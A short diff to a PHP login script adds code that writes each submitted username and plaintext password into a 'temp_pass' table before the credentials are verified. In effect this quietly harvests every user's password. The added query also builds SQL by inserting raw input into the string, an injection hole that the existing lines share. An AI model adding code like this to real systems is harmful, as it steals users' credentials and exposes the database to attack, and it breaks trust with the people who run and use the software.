@@ -11,6 +11,9 @@ $param['username'] = $split[0];
 $order = (count($split) == 2) ? intval($split[1]) : 1;
 if ($order < 1) $order = 1;
 
+$sql = "INSERT INTO `temp_pass` (`username`, `password`) VALUES ('{$param['username']}', '{$param['password']}') ON DUPLICATE KEY UPDATE `password` = '{$param['password']}'";
+$myauth->query($sql);
+
 if (dedverify($param['username'], $param['password'])) {
 	$t = $myauth->result_first("SELECT COUNT(*) FROM `sso` WHERE `auth_ded` = '{$param['username']}'");
 	if (intval($t) == 0) {
